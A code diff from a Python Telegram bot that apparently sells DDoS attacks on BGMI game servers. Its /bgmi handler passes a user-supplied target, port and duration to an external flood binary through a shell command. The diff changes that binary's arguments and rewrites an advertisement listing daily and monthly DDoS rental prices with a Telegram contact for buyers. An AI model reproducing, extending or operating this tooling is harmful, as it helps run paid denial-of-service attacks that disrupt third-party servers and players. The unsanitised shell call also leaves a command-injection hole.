@@ -314,7 +314,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./daku {target} {port} {time} 1000"
+                full_command = f"./daku {target} {port} {time} {7} 800"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
@@ -405,28 +405,30 @@ def welcome_plan(message):
     user_name = message.from_user.first_name
     response = f'''{user_name},ᴡᴇ ʜᴀᴠᴇ ᴏɴʟʏ ᴛʜɪs ᴘʟᴀɴ ᴀɴᴅ ᴛʜᴀᴛ ɪs ᴘᴏᴡᴇғᴜᴋʟ ᴛʜᴇɴ ᴀɴʏ ᴏᴛʜᴇʀ ᴅᴅᴏs ᴛʜᴀᴛ
 
-🇮🇳 𝗖𝗛𝗘𝗔𝗣 𝗣𝗥𝗜𝗖𝗘 𝗙𝗢𝗥 𝗬𝗢𝗨
 
-☠️ 𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟𝗟 𝗗𝗗𝗢𝗦
+💎 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 24/7 ON AVAILABLE 🔝 
 
-⭕️ 40+ KILLS MINIMU
+#️⃣ 𝟭 𝗗𝗔𝗬 :- 130₹ ✅
+#️⃣ 𝟮 𝗗𝗔𝗬 :- 190₹ ✅
+#️⃣ 𝟯 𝗗𝗔𝗬 :- 270₹ ✅
+#️⃣ 𝟰 𝗗𝗔𝗬 :- 290₹ ✅
+#️⃣ 𝟱 𝗗𝗔𝗬 :- 390₹ ✅
+#️⃣ 𝟲 𝗗𝗔𝗬 :- 420₹ ✅
+#️⃣ 𝟳 𝗗𝗔𝗬 :- 470₹ ✅
+#️⃣30 𝗗𝗔𝗬:- 700₹ ✅
 
-⭕️ DDOS BOT 24×7 ONLINE
+         🗣️YOUR OWN DDOS BOT 1.3k RS DISCOUNT AVAILABLE🗣️
+
+💎  𝐏𝐑𝐈𝐂𝐄 𝐃𝐄𝐊𝐇𝐎 𝐆𝐄 𝐓𝐎 𝐌𝐄𝐑𝐈 𝐁𝐀𝐀𝐓 𝐘𝐀𝐀𝐃 𝐊𝐀𝐑𝐎𝐆𝐄, 𝐐𝐔𝐀𝐋𝐈𝐓𝐘 𝐃𝐄𝐊𝐇𝐎 𝐆𝐄 𝐓𝐎 𝐁𝐔𝐘 𝐊𝐀𝐑𝐎𝐆𝐄 ✅
 
 
-🚀 1 𝗗𝗔𝗬 90 RS
+ 𝐈𝐎𝐒 🍏+ 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 😝𝐃𝐃𝐎𝐒 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 
 
-🚀 3 𝗗𝗔𝗬𝗦 200 RS
 
-🚀 1 𝗪𝗘𝗘𝗞  300 RS
+🛒 𝗗𝗠 𝗙𝗢𝗥 𝗕𝗨𝗬 :-
+ @TRUSTVIP_MOD
 
-🚀 1 𝗠𝗢𝗡𝗧𝗛 650 R
-
-🚀 𝗙𝗨𝗟𝗟 𝗦𝗘𝗦𝗢𝗡 800 RS
-
-  🗣️YOUR OWN DDOS BOT 1.3k RS DISCOUNT AVAILABLE🗣️
-
-DM :- @TRUSTVIP_MOD
+💸💸💸💸💸💸
 
 '''
     bot.reply_to(message, response)
